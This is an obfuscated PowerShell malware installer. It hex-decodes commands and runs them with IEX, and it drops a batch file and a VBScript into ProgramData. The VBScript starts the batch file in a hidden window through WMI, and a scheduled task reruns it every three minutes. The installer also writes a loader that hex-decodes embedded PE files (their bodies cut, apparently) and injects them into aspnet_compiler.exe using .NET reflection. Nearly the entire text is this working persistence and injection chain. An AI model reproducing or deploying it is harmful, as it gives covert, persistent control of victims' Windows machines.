$OutPath = "C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB"
function VOPVITQVJHENFGBTVHWQCB($ROCLEBASGLQTJKOXPYQHTU) {
    $LZAVOBYIRFWZQZVCTGHPQB = ""
    for ($JNFPHLBFVBYBYQWVEETXND = 0; $JNFPHLBFVBYBYQWVEETXND -lt $ROCLEBASGLQTJKOXPYQHTU.Length; $JNFPHLBFVBYBYQWVEETXND += 2)
        {$LZAVOBYIRFWZQZVCTGHPQB += [char][int]("0x" + $ROCLEBASGLQTJKOXPYQHTU.Substring($JNFPHLBFVBYBYQWVEETXND,2))}
    return $LZAVOBYIRFWZQZVCTGHPQB
    }
$NKEKXETXQOZCCCZAPIABJW = VOPVITQVJHENFGBTVHWQCB '696620282D6E6F742028546573742D506174682020244F7574506174682029290D0A20202020202020207B0D0A2020202020202020202020204E65772D4974656D20244F757450617468202D4974656D54797065204469726563746F7279202D466F7263650D0A20202020202020207D'
IEX $NKEKXETXQOZCCCZAPIABJW
start-sleep -s 3
$NHUIZKRVPPIXQTIWGCKEBC = @'
@echo off
sEt !h=e&& sEt U7=n&& sEt k8=d&& sEt db=P
@c^M%k8%.E"x"%!h% /c =%db%oW%!h%rS^h%!h%lL"."%!h%Xe -%U7%o%!h% -%U7%op -%U7%o%U7%I -WI%U7%%k8%oWSTYL%!h% Hi%k8%%k8%%!h%%U7% -%!h%x%!h%cutio%U7%Policy Bypass -fil%!h% C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\WZQNBDSLVGAWPUXJRUVDYE.ps1
exit
'@
Set-Content -Path C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.bat -Value $NHUIZKRVPPIXQTIWGCKEBC
start-sleep -s 3
$TPTYEPSCWWTVJHYHISSENP = @'
C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.vbs
$HWXGLIACJLREOVRHPAYHIU = <##> New-ScheduledTaskAction <##> -Execute <##> 'C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.vbs'
$DRSACWHALXVXXEPJBPRTHA =  New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 3)
Register-ScheduledTask  -Action  $HWXGLIACJLREOVRHPAYHIU  -Trigger  $DRSACWHALXVXXEPJBPRTHA  -TaskName "LZAVOBYIRFWZQZVCTGHPQB"
'@
Set-Content -Path C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.ps1 -Value $TPTYEPSCWWTVJHYHISSENP
start-sleep -s 3
$ZLYOLZOBVKWIPSVSKDIANO = @'
Const HIDDEN_WINDOW = 0
NHUIZKRVPPIXQTIWGCKEBC = "TPTYEPSCWWTVJHYHISSENPinHWXGLIACJLREOVRHPAYHIUgHWXGLIACJLREOVRHPAYHIUts:DRSACWHALXVXXEPJBPRTHA"
NHUIZKRVPPIXQTIWGCKEBC = replace(NHUIZKRVPPIXQTIWGCKEBC,"TPTYEPSCWWTVJHYHISSENP","W")
NHUIZKRVPPIXQTIWGCKEBC = replace(NHUIZKRVPPIXQTIWGCKEBC,"HWXGLIACJLREOVRHPAYHIU","M")
NHUIZKRVPPIXQTIWGCKEBC = replace(NHUIZKRVPPIXQTIWGCKEBC,"DRSACWHALXVXXEPJBPRTHA","\\")
ZLYOLZOBVKWIPSVSKDIANO = "AHSSFYBKVZZKYDUPGJEEWBrTHWQTCXXLESVOIJHDZLJVKtAHSSFYBKVZZKYDUPGJEEWBciGJOFTBQHOJLAXHIJYGVBYVv2"
ZLYOLZOBVKWIPSVSKDIANO = replace(ZLYOLZOBVKWIPSVSKDIANO,"THWQTCXXLESVOIJHDZLJVK","OO")
ZLYOLZOBVKWIPSVSKDIANO = replace(ZLYOLZOBVKWIPSVSKDIANO,"AHSSFYBKVZZKYDUPGJEEWB","\")
ZLYOLZOBVKWIPSVSKDIANO = replace(ZLYOLZOBVKWIPSVSKDIANO,"GJOFTBQHOJLAXHIJYGVBYV","M")
RVWXUUTVPXPZBYOQQNLOLU = "Win32_POQGERYHVJVKCVHNJTWDCFIoceQJCAEEUJTESDPKHOSAOLEFWUXVKSISQQRPTXTNBQNIGXaOQGERYHVJVKCVHNJTWDCFIWUXVKSISQQRPTXTNBQNIGXup"
RVWXUUTVPXPZBYOQQNLOLU = replace(RVWXUUTVPXPZBYOQQNLOLU,"QJCAEEUJTESDPKHOSAOLEF","ssS")
RVWXUUTVPXPZBYOQQNLOLU = replace(RVWXUUTVPXPZBYOQQNLOLU,"OQGERYHVJVKCVHNJTWDCFI","R")
RVWXUUTVPXPZBYOQQNLOLU = replace(RVWXUUTVPXPZBYOQQNLOLU,"WUXVKSISQQRPTXTNBQNIGX","T")
AHPRITEFVISYEIOKIEEAYV = "\rUPHOCWYAGWHFXESZABHTQXUPHOCWYAGWHFXESZABHTQXt\cimvIAYBBOGJARUXTUILKKPZFN:Win3IAYBBOGJARUXTUILKKPZFN_PrUPHOCWYAGWHFXESZABHTQXceORCVADUESABSZQFUVPRROA"
AHPRITEFVISYEIOKIEEAYV = replace(AHPRITEFVISYEIOKIEEAYV,"ORCVADUESABSZQFUVPRROA","ss")
AHPRITEFVISYEIOKIEEAYV = replace(AHPRITEFVISYEIOKIEEAYV,"IAYBBOGJARUXTUILKKPZFN","2")
AHPRITEFVISYEIOKIEEAYV = replace(AHPRITEFVISYEIOKIEEAYV,"UPHOCWYAGWHFXESZABHTQX","O")
        VOPVITQVJHENFGBTVHWQCB = "."
        Set ROCLEBASGLQTJKOXPYQHTU = GetObject( NHUIZKRVPPIXQTIWGCKEBC & VOPVITQVJHENFGBTVHWQCB & ZLYOLZOBVKWIPSVSKDIANO)
        Set LZAVOBYIRFWZQZVCTGHPQB = ROCLEBASGLQTJKOXPYQHTU.Get(RVWXUUTVPXPZBYOQQNLOLU)
        Set JNFPHLBFVBYBYQWVEETXND = LZAVOBYIRFWZQZVCTGHPQB.SpawnInstance_
        JNFPHLBFVBYBYQWVEETXND.ShowWindow = HIDDEN_WINDOW
        Set NKEKXETXQOZCCCZAPIABJW = GetObject("winmgmts:\\" & VOPVITQVJHENFGBTVHWQCB & AHPRITEFVISYEIOKIEEAYV)
        NKEKXETXQOZCCCZAPIABJW.Create "C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.bat", Null, JNFPHLBFVBYBYQWVEETXND, intProcessID
'@
Set-Content -Path C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.vbs -Value $ZLYOLZOBVKWIPSVSKDIANO
start-sleep -s 3
$THWQTCXXLESVOIJHDZLJVK = @'
$VOPVITQVJHENFGBTVHWQCB = '4D5A9--...----'.Replace("-","0") # The omitted '4D5A9--...----' is actually a 32767 character long string.
[String]$ROCLEBASGLQTJKOXPYQHTU= $VOPVITQVJHENFGBTVHWQCB
Function HB {
    [CmdletBinding()]
    [OutputType([byte[]])]
    param(
        [Parameter(Mandatory=$true)] [String]$NKEKXETXQOZCCCZAPIABJW
    )
    $JNFPHLBFVBYBYQWVEETXND = New-Object -TypeName byte[] -ArgumentList ($NKEKXETXQOZCCCZAPIABJW.Length / 2)
    for ($NHUIZKRVPPIXQTIWGCKEBC = 0; $NHUIZKRVPPIXQTIWGCKEBC -lt $NKEKXETXQOZCCCZAPIABJW.Length; $NHUIZKRVPPIXQTIWGCKEBC += 2) {
        $JNFPHLBFVBYBYQWVEETXND[$NHUIZKRVPPIXQTIWGCKEBC / 2] = [Convert]::ToByte($NKEKXETXQOZCCCZAPIABJW.Substring($NHUIZKRVPPIXQTIWGCKEBC, 2), 16)
    }
    return [byte[]]$JNFPHLBFVBYBYQWVEETXND
}
[String]$TPTYEPSCWWTVJHYHISSENP='4D5A9---...---'.Replace("-","0") # The omitted '4D5A9---...---' is actually a 97280 character long string.
[Byte[]]$HWXGLIACJLREOVRHPAYHIU=HB $TPTYEPSCWWTVJHYHISSENP
[Byte[]]$DRSACWHALXVXXEPJBPRTHA= HB $ROCLEBASGLQTJKOXPYQHTU
$ZLYOLZOBVKWIPSVSKDIANO = 'F.B'
$THWQTCXXLESVOIJHDZLJVK = 'I'
$AHSSFYBKVZZKYDUPGJEEWB ='GJTHXBNBWFPKHKJUDZBSYTQ'.Replace('JTHXBNBWFPKHKJUDZBSYTQ','e')
$GJOFTBQHOJLAXHIJYGVBYV = 'DNZCZYNZSZBWZEHKDYKGXNTy'.Replace('DNZCZYNZSZBWZEHKDYKGXN','t')
$RVWXUUTVPXPZBYOQQNLOLU = 'LOTWABVLXILJJGQWTSECDDe'.Replace('LOTWABVLXILJJGQWTSECDD','p')
$QJCAEEUJTESDPKHOSAOLEF = $AHSSFYBKVZZKYDUPGJEEWB+$GJOFTBQHOJLAXHIJYGVBYV+$RVWXUUTVPXPZBYOQQNLOLU
$OQGERYHVJVKCVHNJTWDCFI = 'I';$WUXVKSISQQRPTXTNBQNIGX = 'n';$AHPRITEFVISYEIOKIEEAYV = 'vo';$ORCVADUESABSZQFUVPRROA = 'ke';$FVXOJOAVLRKNTPJJITFWLA = $OQGERYHVJVKCVHNJTWDCFI+$WUXVKSISQQRPTXTNBQNIGX+$AHPRITEFVISYEIOKIEEAYV+$ORCVADUESABSZQFUVPRROA
$IAYBBOGJARUXTUILKKPZFN = "G";$UPHOCWYAGWHFXESZABHTQX = "e";$KBXOBJVSZGEOKXLFJHINHT = "t";$IGKYADSKULBKVGHJESXVIN = "MFLSTRIIJAGTSHKSSJQVIBDod".Replace("FLSTRIIJAGTSHKSSJQVIBD","eth");
$AKGODSVTBAFRULJXWJFIJA =$IAYBBOGJARUXTUILKKPZFN+$UPHOCWYAGWHFXESZABHTQX+$KBXOBJVSZGEOKXLFJHINHT+$IGKYADSKULBKVGHJESXVIN
$JKFCPRLQVWUUDYVAAYQOIS = 'C:\WFIGBLGWAKNIZAZPHXGROGCos'.Replace("FIGBLGWAKNIZAZPHXGROGC","indows\Micr")
$LQBXENLGRDVIWNFCIGQUHV = 'oft.NEIZWGPKYENPSBZLGTVSLNEY319'.Replace("IZWGPKYENPSBZLGTVSLNEY","T\Framework\v4.0.30")
$TDVIFPBFCBDXWFBHWLGOVG = '\aspnet_compiler.exe';$OOTVRVVLIWTJXUBZPWFHZN = $JKFCPRLQVWUUDYVAAYQOIS+$LQBXENLGRDVIWNFCIGQUHV+$TDVIFPBFCBDXWFBHWLGOVG
$DYBQBZHGDYQFIGRSUWSLFF = 'L';$DHZDFUWHSOXPSBNRBRVAPN='a';$LZAVOBYIRFWZQZVCTGHPQB='d';$JYNODSXHCPOWGPYITUHRJD= 'o';$ZVCYAERHJVYSWGDUFOSRJK = $DYBQBZHGDYQFIGRSUWSLFF+$JYNODSXHCPOWGPYITUHRJD+$DHZDFUWHSOXPSBNRBRVAPN+$LZAVOBYIRFWZQZVCTGHPQB;
$WDOGVFNDTUKXLWJKBSLOCL='$nUll'
$CCOFFVDTLOTOCTCRTJGCAB = "[Re";$UYTGATLQARGFXJYIQWQQXE ="flect";$DWYIGZJVANSVFRKQTKZLFQ ="ion.Assembly]";$AYPPVVJJXARRHEOKGFJCLF = ($CCOFFVDTLOTOCTCRTJGCAB,$UYTGATLQARGFXJYIQWQQXE,$DWYIGZJVANSVFRKQTKZLFQ -Join '')|I`E`X
$BBCEXNVHYPJDIQBYCFLURN = $AYPPVVJJXARRHEOKGFJCLF::$ZVCYAERHJVYSWGDUFOSRJK($HWXGLIACJLREOVRHPAYHIU);
$QRZJAWHVFCKNCSHOYHLWIK = '$BBCEXNVHYPJDIQBYCFLURN.$QJCAEEUJTESDPKHOSAOLEF($ZLYOLZOBVKWIPSVSKDIANO).$AKGODSVTBAFRULJXWJFIJA($THWQTCXXLESVOIJHDZLJVK).$FVXOJOAVLRKNTPJJITFWLA';
$SIUEIGTLDKOCVDHNGDOHJF = '($WDOGVFNDTUKXLWJKBSLOCL,[object[]] ($OOTVRVVLIWTJXUBZPWFHZN,$DRSACWHALXVXXEPJBPRTHA))';
$NKEKXETXQOZCCCZAPIABJW=($QRZJAWHVFCKNCSHOYHLWIK,$SIUEIGTLDKOCVDHNGDOHJF -Join '')|I`E`X
'@
Set-Content -Path C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\WZQNBDSLVGAWPUXJRUVDYE.ps1 -Value $THWQTCXXLESVOIJHDZLJVK
start-sleep -s 3
powershell.exe -NoE -Nop -NonI  -WIndoWSTYLe HiDdeN -ExecutionPolicy Bypass -file C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.ps1
